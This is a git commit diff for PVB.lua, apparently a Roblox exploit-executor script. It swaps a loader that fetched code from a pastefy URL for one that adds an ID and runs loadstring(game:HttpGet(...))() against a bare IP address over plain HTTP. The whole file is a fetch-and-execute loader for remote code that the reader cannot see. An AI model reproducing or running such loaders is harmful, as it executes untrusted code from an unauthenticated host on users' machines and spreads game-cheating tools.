907e262fc416c4d6346a114c3d72c3b20c4bf9ce
HK-Scripttss <harukikun57@gmail.com>
2025-10-04 19:44:14 +0800

    Update PVB.lua

--- PVB.lua
+++ PVB.lua
@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://pastefy.app/F2oPPeLf/raw", true))()
+ID="8167f9c1-531d-4a0b-99ac-8dfbea5113af";
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
